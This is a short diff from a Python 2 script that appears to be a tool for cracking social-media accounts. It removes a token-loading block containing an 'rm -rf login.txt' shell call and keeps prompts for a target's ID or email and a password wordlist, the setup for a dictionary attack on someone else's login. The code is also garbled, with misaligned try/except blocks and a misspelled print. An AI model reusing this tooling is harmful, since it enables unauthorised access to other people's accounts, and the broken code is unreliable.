@@ -14,17 +14,7 @@ def keluar():
 
 def main(self, cookie, url, config):
         flist = raw_input('\nEnter ID: ')
-             try:
-                toket = open('login.txt', 'r').read()
-                except IOError:
-                    print '\x1b[1;91m[!] Token not found'
-                    os.system('rm -rf login.txt')
-                    time.sleep(0.5)
-                    login()
-             else:
-                 os.system('clear')
-                   rint '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
-             try:
+            try:
                      email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
                      passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(password.txt) \x1b[1;91m: \x1b[1;97m')
                      total = open(passw, 'r')
